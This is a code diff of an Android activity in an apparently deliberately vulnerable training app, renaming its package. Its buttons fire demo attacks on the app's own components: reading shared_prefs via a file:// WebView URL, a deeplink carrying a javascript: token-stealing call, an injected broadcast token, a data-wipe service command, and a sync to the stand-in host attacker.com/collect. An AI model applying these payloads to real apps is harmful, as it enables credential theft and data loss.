@@ -1,4 +1,4 @@
-package com.vulndroid.app.activities;
+package com.gu3sswe4k.app.activities;
 
 import android.content.ComponentName;
 import android.content.Intent;
@@ -6,7 +6,7 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
-import com.vulndroid.app.R;
+import com.gu3sswe4k.app.R;
 
 public class MainActivity extends AppCompatActivity {
     @Override
@@ -23,7 +23,7 @@ public class MainActivity extends AppCompatActivity {
         findViewById(R.id.btn_webview2).setOnClickListener(v -> startActivity(new Intent(this, WebViewActivity.class)));
         findViewById(R.id.btn_webview3).setOnClickListener(v -> {
             Intent i = new Intent(this, WebViewActivity.class);
-            i.putExtra("url", "file:///data/data/com.vulndroid.app/shared_prefs/user_prefs.xml");
+            i.putExtra("url", "file:///data/data/com.gu3sswe4k.app/shared_prefs/user_prefs.xml");
             startActivity(i);
         });
         findViewById(R.id.btn_webview4).setOnClickListener(v -> startActivity(new Intent(this, WebViewActivity.class)));
@@ -33,7 +33,7 @@ public class MainActivity extends AppCompatActivity {
         findViewById(R.id.btn_deeplink2).setOnClickListener(v -> startActivity(new Intent(this, DeeplinkActivity.class)));
         findViewById(R.id.btn_deeplink_chain).setOnClickListener(v -> {
             Intent i = new Intent(Intent.ACTION_VIEW);
-            i.setData(Uri.parse("vulndroid://settings?redirect=com.vulndroid.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"));
+            i.setData(Uri.parse("vulndroid://settings?redirect=com.gu3sswe4k.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"));
             startActivity(i);
         });
 
@@ -45,7 +45,7 @@ public class MainActivity extends AppCompatActivity {
 
         // Broadcast
         findViewById(R.id.btn_broadcast).setOnClickListener(v -> {
-            Intent b = new Intent("com.vulndroid.app.SEND_TOKEN");
+            Intent b = new Intent("com.gu3sswe4k.app.SEND_TOKEN");
             b.setPackage(getPackageName());
             b.putExtra("token", "INJECTED_" + System.currentTimeMillis());
             b.putExtra("user", "attacker");
@@ -57,14 +57,14 @@ public class MainActivity extends AppCompatActivity {
         // Service
         findViewById(R.id.btn_service_wipe).setOnClickListener(v -> {
             Intent s = new Intent();
-            s.setComponent(new ComponentName(this, "com.vulndroid.app.services.DataSyncService"));
+            s.setComponent(new ComponentName(this, "com.gu3sswe4k.app.services.DataSyncService"));
             s.putExtra("action", "wipe_user_data");
             startService(s);
             Toast.makeText(this, "Wipe triggered!", Toast.LENGTH_SHORT).show();
         });
         findViewById(R.id.btn_service_exfil).setOnClickListener(v -> {
             Intent s = new Intent();
-            s.setComponent(new ComponentName(this, "com.vulndroid.app.services.DataSyncService"));
+            s.setComponent(new ComponentName(this, "com.gu3sswe4k.app.services.DataSyncService"));
             s.putExtra("action", "sync");
             s.putExtra("endpoint", "http://attacker.com/collect");
             startService(s);
